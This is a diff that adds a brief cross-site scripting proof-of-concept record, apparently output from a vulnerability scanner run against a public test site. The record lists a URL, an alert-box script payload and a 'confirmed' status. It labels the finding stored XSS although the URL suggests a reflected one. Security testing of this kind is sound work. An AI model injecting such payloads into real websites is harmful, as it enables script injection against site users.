@@ -1,0 +1,6 @@
+XSS Vulnerability PoC
+Type: Stored_XSS
+URL: http://testphp.vulnweb.com/search.php?test=query
+Payload: <script>alert("XSS")</script>
+Timestamp: 2025-09-06T11:14:51.737779
+Status: VULNERABILITY CONFIRMED
